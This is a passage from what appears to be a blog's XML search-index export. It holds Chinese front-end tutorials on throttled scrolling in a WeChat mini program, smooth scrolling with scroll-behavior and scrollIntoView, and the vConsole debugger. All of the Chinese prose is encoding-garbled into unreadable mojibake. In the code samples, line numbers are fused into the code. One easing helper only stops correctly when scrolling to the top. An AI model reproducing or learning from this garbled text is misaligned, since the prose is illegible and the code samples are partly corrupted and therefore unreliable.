callback) èŽ·å–å¸ƒå±€ä½ç½®ï¼Œç±»ä¼¼äºŽ DOM çš„ getBoundingClientRectã€‚è·ç¦»å¤§å°ä¸ºæœ€å°è´Ÿæ•°çš„æ ‡å¿—ä½æ˜¯å½“å‰åˆšæ»‘è¿‡çš„ï¼Œå³ä¾§ç´¢å¼•æ å¯¹åº”å­—æ¯åº”å½“é«˜äº®ã€‚ 1234&lt;!-- searchGeo.wxml --&gt;&lt;scroll-view bindscroll="scroll" scroll-y="&#123;&#123;true&#125;&#125;"&gt; &lt;!-- åŸŽå¸‚åˆ—è¡¨... --&gt;&lt;/scroll-view&gt; 12345678910111213141516Page(&#123; // ... // åŸŽå¸‚åˆ—è¡¨æ»šåŠ¨ scroll () &#123; wx.createSelectorQuery().selectAll('.city-list-title') .boundingClientRect((rects) =&gt; &#123; let index = rects.findIndex((item) =&gt; &#123; return item.top &gt;= 0 &#125;) if (index === -1) &#123; index = rects.length &#125; this.setIndex(index - 1) &#125;).exec() &#125;, // ... ç‚¹å‡»å³ä¾§å­—æ¯ç´¢å¼•æ çš„å­—æ¯ï¼ŒåŸŽå¸‚åˆ—è¡¨è‡ªåŠ¨æ»‘åŠ¨ä½¿å¾—å¯¹åº”å­—æ¯æ ‡é¢˜å¯è§† æ»¡è¶³è¿™ä¸ªéœ€æ±‚åœºæ™¯ï¼Œå¯ä»¥åˆ©ç”¨ &lt;scroll-view&gt; ç»„ä»¶çš„ scroll-into-view å±žæ€§ï¼Œç”±äºŽå·²æœ‰æ‹¼éŸ³é¦–å­—æ¯æ ‡é¢˜æ·»åŠ æ ‡å¿—ï¼ˆidï¼‰ï¼Œåªéœ€å°†å½“å‰ç‚¹å‡»çš„å­—æ¯å¯¹åº”çš„å…ƒç´ idæ»šåŠ¨åˆ°å¯è§†å³å¯ã€‚éœ€è¦æ³¨æ„ï¼š é¢‘ç¹ setData é€ æˆæ€§èƒ½é—®é¢˜ï¼Œåœ¨è¿™é‡Œè¿‡æ»¤é‡å¤èµ‹å€¼ï¼› ç”±äºŽè®¾ç½®äº† &lt;scroll-view&gt; ä¸ºåŠ¨ç”»æ»šåŠ¨æ•ˆæžœï¼Œæ»šåŠ¨åˆ°æ ‡å¿—å…ƒç´ ä½ç½®éœ€è¦æ—¶é—´ï¼Œé€”ä¸­å¯èƒ½ä¼šç»è¿‡å…¶å®ƒæ ‡å¿—å…ƒç´ ï¼Œä¸èƒ½ç«‹å³è®¾ç½®ç´¢å¼•ç„¦ç‚¹ï¼Œè¦æœ‰ä¸€å®šå»¶æ—¶ï¼ˆè¿˜æ²¡æ‰¾åˆ°å…¶å®ƒå¥½è§£å†³æ–¹æ¡ˆï¼Œæš‚æ—¶è¿™æ ·ï¼‰ 1234567891011121314// ç‚¹å‡»ç´¢å¼•æ¡ tapIndexItem (event) &#123; let id = event.currentTarget.dataset.item this.setData(&#123; scrollIntoViewId: `title_$&#123;id === '#' ? 0 : id&#125;` &#125;) // å»¶æ—¶è®¾ç½®ç´¢å¼•æ¡ç„¦ç‚¹ setTimeout(() =&gt; &#123; this.setData(&#123; barIndex: this.data.indexList.findIndex((item) =&gt; item === id) &#125;) &#125;, 500) &#125;, é¢‘ç¹è§¦å‘èŠ‚æµå¤„ç†é¢‘ç¹è¾“å…¥ï¼Œæˆ–è€…é¢‘ç¹æ»šåŠ¨ï¼Œå›žè°ƒè§¦å‘ä¼šé€ æˆæ€§èƒ½é—®é¢˜ï¼Œè€Œå…¶æŽ¥å£ä¹Ÿæœ‰é™å®šè°ƒç”¨é¢‘çŽ‡ï¼Œè¿™æ ·å°±éœ€è¦åšèŠ‚æµå¤„ç†ã€‚èŠ‚æµæ˜¯å†é¢‘ç¹è§¦å‘çš„æƒ…å†µä¸‹ï¼Œåœ¨å¤§äºŽä¸€å®šæ—¶é—´é—´éš”æ‰å…è®¸è§¦å‘ã€‚ 1234567891011// èŠ‚æµconst throttle = function(fn, delay) &#123; let lastTime = 0 return function () &#123; let nowTime = Date.now() if (nowTime - lastTime &gt; delay || !lastTime) &#123; fn.apply(this, arguments) lastTime = nowTime &#125; &#125;&#125; å…·ä½“å¯¹ä¸€äº›åœºæ™¯ï¼Œæ¯”å¦‚è…¾è®¯ä½ç½®æœåŠ¡æä¾›çš„å…³é”®å­—æœç´¢åœ°å€ï¼Œå°±é™å®š5æ¬¡/key/ç§’ï¼Œå¾ˆå®¹æ˜“å°±è¶…äº†ï¼Œå¯ä»¥åšèŠ‚æµå¤„ç† 12345678910111213141516171819202122232425262728Page(&#123; // ... // è¾“å…¥æœç´¢å…³é”®å­— input: util.throttle(function () &#123; let val = arguments[0].detail.value if (val === '') &#123; this.setData(&#123; suggList: [] &#125;) this.changeSearchCls() return false &#125; api.getSuggestion(&#123; keyword: val &#125;) .then((res) =&gt; &#123; this.setData(&#123; suggList: res &#125;) this.changeSearchCls() &#125;) .catch((err) =&gt; &#123; console.error(err) &#125;) &#125;, 500), // ...&#125;) å¯¹äºŽä¸Šé¢åŸŽå¸‚åˆ—è¡¨æ»šåŠ¨ï¼ŒèŽ·å–æ ‡å¿—å…ƒç´ ä½ç½®ä¹Ÿåº”ç”¨èŠ‚æµå¤„ç†ã€‚ æ€»ç»“å°ç¨‹åºçš„åŸºæœ¬å…¥é—¨å­¦ä¹ é—¨æ§›ä¸é«˜ï¼Œå°ç¨‹åºçš„è®¾è®¡åº”è¯¥å€Ÿé‰´äº†å¾ˆå¤šçŽ°åœ¨æµè¡Œçš„æ¡†æž¶ï¼Œå¦‚æžœæœ‰ React æˆ– Vue çš„åŸºç¡€ä¼šæœ‰å¾ˆå¤šä¼¼æ›¾ç›¸è¯†çš„æ„Ÿè§‰ï¼Œå½“ç„¶ï¼Œåœ¨æ·±å…¥çš„æŽ¢ç´¢è¿‡ç¨‹è¿˜æœ‰å¾ˆå¤šâ€œå‘â€è¦è·¨è¶Šï¼Œæœ¬æ–‡åªæ˜¯ç®€å•çš„æ¢³ç†ï¼Œå…·ä½“é—®é¢˜è¿˜èƒ½å¤šçœ‹æ–‡æ¡£å’Œå°ç¨‹åºç¤¾åŒºï¼Œè¿˜æœ‰ä»€ä¹ˆé”™è¯¯æ¬¢è¿ŽæŒ‡æ­£å“ˆï¼Œå®Œ~]]></content>
      <categories>
        <category>å°ç¨‹åº</category>
      </categories>
      <tags>
        <tag>å°ç¨‹åº</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[scrollIntoView]]></title>
    <url>%2F2018%2F10%2F25%2FscrollIntoView%2F</url>
    <content type="text"><![CDATA[å‰è¨€åœ¨å®žé™…åº”ç”¨ä¸­ï¼Œç»å¸¸ç”¨åˆ°æ»šåŠ¨åˆ°é¡µé¢é¡¶éƒ¨æˆ–æŸä¸ªä½ç½®ï¼Œä¸€èˆ¬ç®€å•ç”¨é”šç‚¹å¤„ç†æˆ–ç”¨jså°†document.body.scrollTopè®¾ç½®ä¸º0ï¼Œç»“æžœæ˜¯é¡µé¢ä¸€é—ªè€Œè¿‡æ»šåˆ°æŒ‡å®šä½ç½®ï¼Œä¸æ˜¯ç‰¹åˆ«å‹å¥½ã€‚æˆ‘ä»¬æƒ³è¦çš„æ•ˆæžœæ˜¯è¦æœ‰ç‚¹ç¼“å†²æ•ˆæžœã€‚ çŽ°ä»£æµè§ˆå™¨é™†ç»­æ„è¯†åˆ°äº†è¿™ç§éœ€æ±‚ï¼ŒscrollIntoViewæ„æ€æ˜¯æ»šåŠ¨åˆ°å¯è§†ï¼Œcssä¸­æä¾›äº†scroll-behaviorå±žæ€§ï¼Œjsæœ‰Element.scrollIntoView()æ–¹æ³•ã€‚ scroll-behaviorscroll-behaviorå±žæ€§å¯å–å€¼auto|smooth|inherit|unset scroll-behavior: smooth;æ˜¯æˆ‘ä»¬æƒ³è¦çš„ç¼“å†²æ•ˆæžœã€‚åœ¨PCæµè§ˆå™¨ä¸­ï¼Œé¡µé¢é»˜è®¤æ»šåŠ¨æ˜¯åœ¨&lt;html&gt;æ ‡ç­¾ä¸Šï¼Œç§»åŠ¨ç«¯å¤§å¤šæ•°åœ¨&lt;body&gt;æ ‡ç­¾ä¸Šï¼Œåœ¨æˆ‘ä»¬æƒ³è¦å®žçŽ°å¹³æ»‘â€œå›žåˆ°é¡¶éƒ¨â€ï¼Œåªéœ€åœ¨è¿™ä¸¤ä¸ªæ ‡ç­¾ä¸Šéƒ½åŠ ä¸Šï¼š 123html, body &#123; scroll-behavior: smooth;&#125; å‡†ç¡®çš„è¯´ï¼Œå†™åœ¨å®¹å™¨å…ƒç´ ä¸Šï¼Œå¯ä»¥è®©å®¹å™¨ï¼ˆéžé¼ æ ‡æ‰‹åŠ¿è§¦å‘ï¼‰çš„æ»šåŠ¨å˜å¾—å¹³æ»‘ï¼Œè€Œä¸å±€é™äºŽ&lt;html&gt;ï¼Œ&lt;body&gt;æ ‡ç­¾ã€‚ åˆ©ç”¨è¿™ä¸ªcsså±žæ€§å¯ä»¥ä¸€æ­¥å°†åŽŸæ¥çº¯cssæ ‡ç­¾ç›´æŽ¥åˆ‡æ¢ï¼Œå˜æˆå¹³æ»‘è¿‡æ¸¡åˆ‡æ¢æ•ˆæžœã€‚ 123456789101112131415161718192021222324252627282930313233343536373839.tab label &#123; padding: 10px; border: 1px solid #ccc; margin-right: -1px; text-align: center; float: left; overflow: hidden;&#125;.tab::after &#123; content: ""; display: table; clear: both;&#125;.box &#123; height: 200px; border: 1px solid #ccc; scroll-behavior: smooth; overflow: hidden; margin-top: 10px;&#125;.item &#123; height: 100%; position: relative; overflow: hidden;&#125;.item input &#123; position: absolute; top: 0; height: 100%; width: 1px; border: 0; padding: 0; margin: 0; clip: rect(0 0 0 0);&#125; 1234567891011121314151617181920&lt;h1&gt;çº¯CSSé€‰é¡¹å¡&lt;/h1&gt;&lt;div class="tab"&gt; &lt;label for="tab1"&gt;é€‰é¡¹å¡1&lt;/label&gt; &lt;label for="tab2"&gt;é€‰é¡¹å¡2&lt;/label&gt; &lt;label for="tab3"&gt;é€‰é¡¹å¡3&lt;/label&gt;&lt;/div&gt;&lt;div class="box"&gt; &lt;div class="item"&gt; &lt;input type="text" id="tab1"&gt; &lt;p&gt;é€‰é¡¹å¡1å†…å®¹&lt;/p&gt; &lt;/div&gt; &lt;div class="item"&gt; &lt;input type="text" id="tab2"&gt; &lt;p&gt;é€‰é¡¹å¡2å†…å®¹&lt;/p&gt; &lt;/div&gt; &lt;div class="item"&gt; &lt;input type="text" id="tab3"&gt; &lt;p&gt;é€‰é¡¹å¡3å†…å®¹&lt;/p&gt; &lt;/div&gt;&lt;/div&gt; å®žçŽ°æ•ˆæžœ ä¹Ÿå¯ä»¥æˆ³è¿™é‡Œ å†æ¥çœ‹ä¸€ä¸‹è¿™ä¸ªcsså±žæ€§scroll-behavioråœ¨å„å¤§æµè§ˆå™¨ä¸­çš„æ”¯æŒæƒ…å†µ å‘ƒ~æ”¯æŒåº¦ä¸æ˜¯å¾ˆå¥½ï¼Œè¿™æ ·ä¸€è¡Œcssä»£ç èƒ½åº”ç”¨ä¸Šå½“ç„¶æ˜¯æœ€å¥½çš„ï¼Œä¸è¡Œå°±é€€åŒ–æˆä¸€é—ªè€Œè¿‡çš„æ•ˆæžœå’¯ã€‚ä¸‹é¢å†çœ‹ä¸‹jsæä¾›çš„apiã€‚ Element.scrollIntoView()Element.scrollIntoView() æ–¹æ³•è®©å½“å‰çš„å…ƒç´ æ»šåŠ¨åˆ°æµè§ˆå™¨çª—å£çš„å¯è§†åŒºåŸŸå†…ã€‚ element.scrollIntoView(); // ç­‰åŒäºŽelement.scrollIntoView(true)element.scrollIntoView(alignToTop); // Booleanåž‹å‚æ•°element.scrollIntoView(scrollIntoViewOptions); // Objectåž‹å‚æ•° å‚æ•°alignToTopä¸€ä¸ªBooleanå€¼ï¼š å¦‚æžœä¸ºtrueï¼Œå…ƒç´ çš„é¡¶ç«¯å°†å’Œå…¶æ‰€åœ¨æ»šåŠ¨åŒºçš„å¯è§†åŒºåŸŸçš„é¡¶ç«¯å¯¹é½ã€‚ç›¸åº”çš„scrollIntoViewOptions: {block: &quot;start&quot;, inline: &quot;nearest&quot;}ã€‚è¿™æ˜¯è¿™ä¸ªå‚æ•°çš„é»˜è®¤å€¼ã€‚ å¦‚æžœä¸ºfalseï¼Œå…ƒç´ çš„åº•ç«¯å°†å’Œå…¶æ‰€åœ¨æ»šåŠ¨åŒºçš„å¯è§†åŒºåŸŸçš„åº•ç«¯å¯¹é½ã€‚ç›¸åº”çš„scrollIntoViewOptions: {block: &quot;end&quot;, inline: &quot;nearest&quot;}ã€‚ å‚æ•°scrollIntoViewOptionsä¸€ä¸ªå¸¦æœ‰é€‰é¡¹çš„ objectï¼š 1234&#123; behavior: "auto" | "instant" | "smooth", block: "start" | "end",&#125; behavior å¯é€‰å®šä¹‰ç¼“åŠ¨åŠ¨ç”»ï¼Œ â€œautoâ€, â€œinstantâ€, æˆ– â€œsmoothâ€ ä¹‹ä¸€ã€‚é»˜è®¤ä¸º â€œautoâ€ã€‚ block å¯é€‰&quot;start&quot;, &quot;center&quot;, &quot;end&quot;, æˆ– &quot;nearest&quot;ä¹‹ä¸€ã€‚é»˜è®¤ä¸º &quot;center&quot;ã€‚ inline å¯é€‰&quot;start&quot;, &quot;center&quot;, &quot;end&quot;, æˆ– &quot;nearest&quot;ä¹‹ä¸€ã€‚é»˜è®¤ä¸º &quot;nearest&quot;ã€‚ æµè§ˆå™¨æ”¯æŒ å¯ä»¥çœ‹åˆ°å¯¹äºŽæ— å‚æ•°çš„æƒ…å†µæ”¯æŒè¿˜æ˜¯å¾ˆå¥½çš„ï¼Œæœ‰å‚æ•°çš„è¯¥APIåœ¨æµè§ˆå™¨ä¸­æ”¯æŒä¸æ˜¯å¾ˆå¥½ï¼Œæˆ‘ä»¬å¯ä»¥åŒæ—¶ç»“åˆCSSè®¾ç½®scroll-behavior: smooth;æ»šåŠ¨æ•ˆæžœï¼Œåœ¨æ‰§è¡Œæ»šåŠ¨ä½¿ç”¨target.scrollIntoView()ï¼Œå³å¯è¾¾åˆ°â€œå®Œç¾Žæ»šåŠ¨â€ï¼ˆä¸å¤ªå®Œç¾Žï¼‰æ•ˆæžœã€‚ å‘ä¸‹å…¼å®¹è¦è¾¾åˆ°æ‰€æœ‰æµè§ˆå™¨éƒ½æœ‰ç›¸åŒï¼ˆç±»ä¼¼ï¼‰æ•ˆæžœï¼Œé‚£å°±è¦æŠŠå‰©ä½™ä¸æ”¯æŒscroll-behaviorå±žæ€§çš„æµè§ˆå™¨æªå‡ºæ¥ï¼Œç”¨jsåŽ»å®Œæˆä½¿å‘½äº†ã€‚ åˆ¤æ–­æ˜¯å¦æ”¯æŒscroll-behaviorå±žæ€§å¾ˆç®€å•ï¼Œç”¨ä»¥ä¸‹è¿™ä¸€è¡Œä»£ç  123456if(typeof window.getComputedStyle(document.body).scrollBehavior === 'undefined') &#123; // å…¼å®¹jsä»£ç &#125; else &#123; // åŽŸç”Ÿæ»šåŠ¨api // Element.scrollIntoView()&#125; åˆ¤æ–­æ˜¯å¦æ”¯æŒscroll-behaviorå±žæ€§ï¼Œç›´æŽ¥åˆ©ç”¨åŽŸç”ŸElement.scrollIntoView()æ»šåŠ¨ï¼Œå¦åˆ™å‘ä¸‹å…¼å®¹å¤„ç†ã€‚ ç¼“å†²ç®—æ³•ç¼“å†²çš„ç›´è§‚æ•ˆæžœæ˜¯è¶Šæ¥è¶Šæ…¢ï¼Œç›´åˆ°åœæ­¢ï¼Œä¹Ÿå°±æ˜¯åœ¨ç›¸åŒæ—¶é—´å†…è¿åŠ¨çš„è·ç¦»è¶Šæ¥è¶ŠçŸ­ã€‚è¿™æ ·å¯ä»¥è®¾ç½®ä¸€ä¸ªå®šæ—¶å™¨ï¼Œç§»åŠ¨åˆ°å½“å‰ç‚¹åˆ°ç›®æ ‡ç‚¹è·ç¦»çš„ç¼“å†²çŽ‡ï¼ˆæ¯”å¦‚1/2ï¼Œ1/3ï¼Œâ€¦ï¼‰å¤„ï¼Œæ¯”å¦‚ï¼Œç¼“å†²çŽ‡è®¾ä¸º2ï¼Œå½“å‰è·ç¦»ç›®æ ‡ç‚¹64pxï¼Œä¸‹ä¸€ç§’å°±æ˜¯32pxï¼Œç„¶åŽ16pxï¼Œ8pxâ€¦ï¼Œåˆ°è¾¾æŸä¸ªé˜ˆå€¼ç»“æŸï¼Œä¹Ÿå°±æ˜¯ï¼š 1var position = position + (destination - position) / n; ä¸‹é¢æ¥ç®€å•å®žçŽ°ä¸€ä¸ªç‚¹å‡»å³ä¸‹æ–¹çš„â€å›žåˆ°é¡¶éƒ¨â€œæŒ‰é’®ï¼Œé¡µé¢ç¼“åŠ¨æ»šåŠ¨åˆ°é¡¶éƒ¨çš„demoã€‚ 1234567&lt;div class="content"&gt; &lt;p&gt;å¾ˆå¤šå†…å®¹ã€‚ã€‚ã€‚&lt;/p&gt; ... &lt;/div&gt; &lt;section class="back-to-top"&gt; å›žåˆ°é¡¶éƒ¨ &lt;/section&gt; 12345678910111213141516171819.content &#123; height: 3000px; border: 1px solid #ccc; box-shadow: 0 0 2px solid;&#125;.back-to-top &#123; width: 18px; padding: 10px; border: 1px solid #ccc; box-shadow: 0 0 2px #333; position: fixed; right: 20px; bottom: 40px;&#125;.back-to-top:hover &#123; cursor: pointer;&#125; 12345678910111213141516171819202122232425262728var scrollTopSmooth = function (position) &#123; // ä¸å­˜åœ¨åŽŸç”Ÿ`requestAnimationFrame`ï¼Œç”¨`setTimeout`æ¨¡æ‹Ÿæ›¿ä»£ if (!window.requestAnimationFrame) &#123; window.requestAnimationFrame = function (cb) &#123; return setTimeout(cb, 17); &#125;; &#125; // å½“å‰æ»šåŠ¨é«˜åº¦ var scrollTop = document.documentElement.scrollTop || document.body.scrollTop; // step var step = function () &#123; var distance = position - scrollTop; scrollTop = scrollTop + distance / 5; if (Math.abs(distance) &lt; 1) &#123; window.scrollTo(0, position); &#125; else &#123; window.scrollTo(0, scrollTop); requestAnimationFrame(step); &#125; &#125;; step();&#125;$backToTop = document.querySelector('.back-to-top')$backToTop.addEventListener('click', function () &#123; scrollTopSmooth(0);&#125;, false);&lt;/script&gt; æ•ˆæžœå›¾ æˆ–è€…æˆ³è¿™é‡Œ ç®€å•å°è£…ä¸Šé¢çš„å°demoä¸­ï¼Œç¼“å†²ç®—æ³•å’Œå½“å‰æ»šåŠ¨ä¸šåŠ¡ä»£ç è€¦åˆåœ¨ä¸€èµ·äº†ï¼Œä¸‹é¢å•ç‹¬æ‹†è§£å‡ºå•ç‹¬ä¸€ä¸ªå‡½æ•°ã€‚ 1234567891011121314151617181920212223242526272829303132/*** ç¼“å†²å‡½æ•°* @param &#123;Number&#125; position å½“å‰æ»šåŠ¨ä½ç½®* @param &#123;Number&#125; destination ç›®æ ‡ä½ç½®* @param &#123;Number&#125; rate ç¼“åŠ¨çŽ‡* @param &#123;Function&#125; callback ç¼“åŠ¨ç»“æŸå›žè°ƒå‡½æ•° ä¸¤ä¸ªå‚æ•°åˆ†åˆ«æ˜¯å½“å‰ä½ç½®å’Œæ˜¯å¦ç»“æŸ*/var easeout = function (position, destination, rate, callback) &#123; if (position === destination || typeof destination !== 'number') &#123; return false; &#125; destination = destination || 0; rate = rate || 2; // ä¸å­˜åœ¨åŽŸç”Ÿ`requestAnimationFrame`ï¼Œç”¨`setTimeout`æ¨¡æ‹Ÿæ›¿ä»£ if (!window.requestAnimationFrame) &#123; window.requestAnimationFrame = function (fn) &#123; return setTimeout(fn, 17); &#125; &#125; var step = function () &#123; position = position + (destination - position) / rate; if (position &lt; 1) &#123; callback(destination, true); return; &#125; callback(position, false); requestAnimationFrame(step); &#125;; step();&#125; æ‹†åˆ†åŽï¼Œè¿™ä¸ªå°ç¼“å†²ç®—æ³•å°±å¯ä»¥è¢«é‡å¤è°ƒç”¨å•¦ï¼Œè€Œä¸”ï¼Œé€‚ç”¨äºŽæ»šåŠ¨åˆ°æŒ‡å®šä½ç½®ï¼ˆä¸ä»…ä»…æ˜¯åˆ°é¡¶éƒ¨ï¼‰å’Œç¼“å†²çŽ‡ï¼ˆæŽ§åˆ¶æ»šåŠ¨å¿«æ…¢ï¼‰ï¼Œå½“å‰å°demoè°ƒç”¨ï¼š 123456789101112var scrollTopSmooth = function (position) &#123; // å½“å‰æ»šåŠ¨é«˜åº¦ var scrollTop = document.documentElement.scrollTop || document.body.scrollTop; easeout(scrollTop, 0, 5, function (val) &#123; window.scrollTo(0, val); &#125;);&#125;$backToTop = document.querySelector('.back-to-top')$backToTop.addEventListener('click', function () &#123; scrollTopSmooth(0);&#125;, false); æ€»ç»“ç»¼åˆæ¥çœ‹ï¼Œç®€å•å®žçŽ°ä¸€ä¸ªå®Œç¾Žæ»šåŠ¨æ³¨æ„ä»¥ä¸‹å³å¯ &lt;html&gt;ï¼Œ&lt;body&gt;æ ‡ç­¾åŠ ä¸Šscroll-behavior: smooth;å±žæ€§ï¼› åˆ¤æ–­å½“å‰æµè§ˆå™¨æ˜¯å¦æ”¯æŒscrollBehaviorå±žæ€§ï¼› å¦‚æžœæ”¯æŒç›´æŽ¥ç”¨åŽŸç”Ÿæ»šåŠ¨apiElement.scrollIntoView()ï¼› å¦‚æžœä¸æ”¯æŒåˆ™ç”¨jså°ç¼“å†²ç®—æ³•å…¼å®¹å¤„ç†ã€‚ å®Œ~]]></content>
      <categories>
        <category>javascript</category>
      </categories>
      <tags>
        <tag>javascript</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[vConsole]]></title>
    <url>%2F2018%2F09%2F26%2FvConsole%2F</url>
    <content type="text"><![CDATA[å‰è¨€ä½ æ˜¯å¦é‡åˆ°è¿™æ ·çš„æƒ…å†µï¼Ÿä½ çš„ç§»åŠ¨ç«¯é¡¹ç›®ä¸Šçº¿ï¼Œçªç„¶ç”¨æˆ·å‘çŽ°æŸä¸ªé¡µé¢æˆ–åŠŸèƒ½ä¸èƒ½ç”¨äº†ï¼ŒæŒ‰ç…§æ‰€è§å³æ‰€å¾—åŽŸç†ï¼Œäº§å“ç¬¬ä¸€æ—¶é—´è‚¯å®šæªå‡ºä½ è¿™ä¸ªå‰ç«¯erèµ·æ¥æ”¹bugï¼Œè€Œæ­¤æ—¶ä½ æ­£åœ¨ä¸‹ç­çš„åœ°é“ä¸Šæˆ–è¿œæ–¹æ‰¾ä¸ªæ¸…é™çš„åœ°æ–¹ä½›ï¼ˆhaiï¼‰ç³»ï¼ˆpiï¼‰ï¼Œåæ­£å°±æ˜¯æ²¡æœ‰ç”µè„‘æˆ–ç½‘ç»œçŽ¯å¢ƒæä¾›æ¡ä»¶åŒºè°ƒè¯•ä½ çš„å‰ç«¯é¡µé¢ã€‚ åœ¨å¼€å‘ç§»åŠ¨ç«¯é¡µé¢éš¾å¤„é™¤äº†å…¼å®¹çº·æ‚æœºåž‹å±å¹•ï¼Œè¿˜æœ‰åœ¨å®žé™…ç»ˆç«¯ä¸Šè°ƒè¯•ï¼ŒåŽŸç”Ÿappã€å¾®ä¿¡å°ç¨‹åºå¼€å‘å¯ä»¥æŠ“æ—¥å¿—æ‰“å°ï¼Œè€Œé¡µé¢h5å¼€å‘æ‰“å°æ˜¯ä¸ä¼šæ˜¾ç¤ºçš„ã€‚ æ€Žæ ·èƒ½ä»Žå‰ç«¯å¼€å§‹å¿«é€Ÿå®šä½é—®é¢˜å‘¢ï¼Ÿä½œä¸ºå‰ç«¯erçš„å·¥ä½œå°±æ˜¯è¦æŠŠæµè§ˆå™¨åé¦ˆçš„ä¿¡æ¯éƒ½èƒ½æ”¾åˆ°é¡µé¢è®©ç”¨æˆ·çœ‹åˆ°ï¼Œé”™è¯¯ä¿¡æ¯ä¹Ÿä¸ä¾‹å¤–ï¼Œåªä¸è¿‡è¦åœ¨ä¸å½±å“ç”¨æˆ·ä½¿ç”¨çš„å‰æä¸‹ï¼Œé€‰æ‹©ä¸€ä¸ªåˆé€‚çš„æ—¶æœºã€‚ è€ŒvConsoleå°±æ˜¯ä¸ºç§»åŠ¨ç«¯è°ƒè¯•åˆ©å™¨ä¹‹ä¸€ï¼Œèƒ½å¤Ÿåœ¨ç§»åŠ¨ç«¯è®¾å¤‡ä¸ŠæŸ¥çœ‹logã€æµè§ˆå™¨ä¿¡æ¯ã€ç½‘ç»œä¿¡æ¯ã€é¡µé¢å…ƒç´ å’Œæœ¬åœ°å­˜å‚¨ï¼ˆCookieå’ŒLocalStorageï¼‰ï¼Œç”±è…¾è®¯å›¢é˜Ÿå¼€æºï¼Œä¸‹è½½æœ€æ–°ç‰ˆæœ¬æˆ–npm install vconsoleå®‰è£…ï¼Œé¡µé¢å¼•å…¥å³å¯ã€‚ æ‰«æè¿™ä¸ªäºŒç»´ç ç«‹é©¬åœ¨çº¿æŸ¥çœ‹æ•ˆæžœ è¯¦ç»†å‚è€ƒvConsoleä½¿ç”¨æ•™ç¨‹ï¼Œåœ¨è¿™é‡Œä¸ç´¯è¿°ã€‚ä»¥ä¸‹è®°å½•å‡ ç‚¹åœ¨ä½¿ç”¨è¿‡ç¨‹ä¸­æ³¨æ„ç‚¹ã€‚ åˆå§‹åŒ–åœ¨å¼•å…¥vConsoleåŽï¼Œéœ€è¦æ‰‹åŠ¨åˆå§‹åŒ– 1var vConsole = new VConsole(option); optionæ˜¯ä¸€ä¸ªé€‰å¡«çš„Objectå¯¹è±¡ï¼Œå…·ä½“é…ç½®å®šä¹‰å¯ä»¥å‚è€ƒå…¬å…±å±žæ€§åŠæ–¹æ³• ä¸€èˆ¬å°†vConsoleçš„åˆå§‹åŒ–å®žä¾‹å•ç‹¬æ‹¿å‡ºæ¥ï¼Œé™¤äº†è®©æ’ä»¶ç‹¬ç«‹ï¼Œè¿˜æœ‰å¯ä»¥è®©æ’ä»¶èƒ½æŒ‰éœ€å¼•å…¥ï¼Œè¿™ä¸ªåŽé¢è¯´ã€‚ 12345// vconsole.jsæ–‡ä»¶import VConsole from 'vconsole'let vConsole = new VConsole()vConsole.setOption('maxLogNumber', 5000) æœªåŠ è½½ vConsole æ¨¡å—æ—¶ï¼Œconsole.log() ä¼šç›´æŽ¥æ‰“å°åˆ°åŽŸç”ŸæŽ§åˆ¶å°ä¸­ï¼›åŠ è½½ vConsole åŽï¼Œæ—¥å¿—ä¼šæ‰“å°åˆ°é¡µé¢å‰ç«¯+åŽŸç”ŸæŽ§åˆ¶å°ã€‚ åŠ è½½åŽï¼Œåœ¨æˆ‘ä»¬çš„ç§»åŠ¨ç«¯é¡µé¢å°±ä¼šæ¼‚æµ®ä¸€ä¸ªvConsoleç»¿è‰²æŒ‰é’®ï¼Œç‚¹å‡»å±•å¼€ä¸€ä¸ªå¼¹çª—é¢æ¿ã€‚ å¼‚æ­¥åŠ è½½å¯¹äºŽç§»åŠ¨ç«¯é¡µé¢ï¼Œå¬è¯´ä¸€ä¸ªä¼˜ç§€çš„å‰ç«¯erå¾€å¾€çœ‹é‡é¡µé¢æ€§èƒ½ï¼Œèƒ½å°‘åŠ è½½å°½é‡å°‘ï¼Œç‰¹åˆ«æ˜¯å¯¹äºŽé¦–å±åŠ è½½ï¼Œå“å¾—æˆ‘èµ¶å¿«åŽ»çœ‹çœ‹vConsoleçš„æ–‡ä»¶vconsole.min.jså¤§å°ï¼Œæœ‰77KBï¼Œä½œä¸ºä¸€ä¸ªè¾…åŠ©æ’ä»¶è¿˜ç®—æ˜¯æŒºå¤§çš„ï¼Œå› æ­¤ ä¸å»ºè®®æ··æ‚æ‰“åŒ…åœ¨å…¶å®ƒä¸šåŠ¡ä»£ç é‡Œï¼Œå³ç”¨ES6çš„importå‡½æ•°åŠ¨æ€åŠ è½½å•ç‹¬çš„jsæ–‡ä»¶ï¼› æœ€å¥½ä¹Ÿä¸å½±å“é¡µé¢åŠ è½½ï¼Œæ’å…¥åˆ°htmlä»£ç &lt;script&gt;æ ‡ç­¾åŠ asyncå±žæ€§è®©jså¼‚æ­¥åŠ è½½å®Œæˆæ‰§è¡Œã€‚ ç»¼ä¸Šåœ¨é¡¹ç›®ä¸­å¤„ç†å¦‚ä¸‹ï¼š 12// æŠŠç‹¬ç«‹å‡ºçš„vconsole.jsæŒ‰éœ€å¼•å…¥import('~/plugins/vconsole') å¼€å…³æŽ§åˆ¶åŠ è½½æˆ‘ä»¬å¯ä»¥é€šè¿‡é…ç½®æ¥å†³å®šæ˜¯å¦å¯ç”¨åŠ è½½vConsoleï¼Œè¿™æ ·ï¼Œåœ¨å¼€å‘çŽ¯å¢ƒå°±å¯ä»¥åœ¨ç§»åŠ¨ç«¯æŸ¥çœ‹æ‰“å°æ—¥å¿—å’Œå…¶å®ƒä¿¡æ¯ã€‚å½“ç„¶ï¼Œä¸èƒ½æŠŠè¿™é¡¹åŠŸèƒ½ç›´æŽ¥å¼€æ”¾åˆ°ç”ŸæˆçŽ¯å¢ƒï¼Œå½±å“ç”¨æˆ·ä½¿ç”¨ï¼ˆç”¨æˆ·æ‰ä¸å…³å¿ƒä½ çš„æ‰“å°å¸®ä½ æŽ’æŸ¥é—®é¢˜ï¼‰ã€‚ é‚£ä¹ˆï¼Œé—®é¢˜æ¥äº†ï¼Œç”Ÿäº§çŽ¯å¢ƒæ€Žæ ·åšèƒ½å’Œè°ä¸¤è€…å…³ç³»å‘¢ï¼Ÿè¿™æ ·è¦ä»Žé“¾æŽ¥åˆ°å½“å‰é¡µé¢çš„urlå‚æ•°å…¥æ‰‹äº†ï¼Œå¯ä»¥è‡ªå·±å®šä¹‰ä¸€ä¸ªåªæœ‰ä½ 